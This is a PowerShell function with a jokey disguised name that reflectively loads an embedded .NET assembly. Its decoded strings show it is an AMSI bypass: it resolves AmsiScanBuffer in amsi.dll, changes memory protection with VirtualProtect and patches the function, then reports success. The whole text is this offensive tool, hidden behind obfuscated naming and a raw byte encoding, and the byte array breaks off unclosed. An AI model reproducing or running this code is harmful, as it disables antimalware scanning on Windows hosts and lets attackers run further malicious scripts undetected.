function GiveBanana{
  if(-not ([System.Management.Automation.PSTypeName]"GiveBananaTo.AngerMonkeyScriptInterrogator").Type) {
    [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 